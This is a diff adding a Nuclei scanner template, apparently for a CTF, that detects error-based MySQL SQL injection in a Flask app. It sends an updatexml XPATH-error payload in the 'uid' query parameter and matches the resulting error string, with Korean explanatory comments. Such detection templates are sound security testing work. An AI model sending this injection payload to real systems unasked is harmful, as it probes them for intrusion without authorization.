@@ -1,0 +1,26 @@
+id: flask-sqli-detection
+
+info:
+  name: Flask Error-Based SQLi Detection
+  author: jebeen
+  severity: high
+  description: |
+    Detects Error-Based SQL Injection by forcing a specific XPATH syntax error.
+    Payload triggers: "XPATH syntax error: ':nuclei_check:'"
+  tags: ctf, sqli, mysql, error-based
+
+http:
+  - method: GET
+    path:
+      # [탐지 Payload]
+      # ' AND updatexml(1, concat(0x3a, 'nuclei_check', 0x3a), 1)-- -
+      # 0x3a는 콜론(:)입니다. 즉, ':nuclei_check:' 라는 문자열로 에러를 유발합니다.
+      - "{{BaseURL}}/?uid=%27%20AND%20updatexml(1,concat(0x3a,%27nuclei_check%27,0x3a),1)--%20-"
+
+    matchers:
+      # [검증]
+      # 서버가 돌려준 에러 메시지 안에 우리가 심어놓은 'nuclei_check'가 그대로 있는지 확인
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error: ':nuclei_check:'"
